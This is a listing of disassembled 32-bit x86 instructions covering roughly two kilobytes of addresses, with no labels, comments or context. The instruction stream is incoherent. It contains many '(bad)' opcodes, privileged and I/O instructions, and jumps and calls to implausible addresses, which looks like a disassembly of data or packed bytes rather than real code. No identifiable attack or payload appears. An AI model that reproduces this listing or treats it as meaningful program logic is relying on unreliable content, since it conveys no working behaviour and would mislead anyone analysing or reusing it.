  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
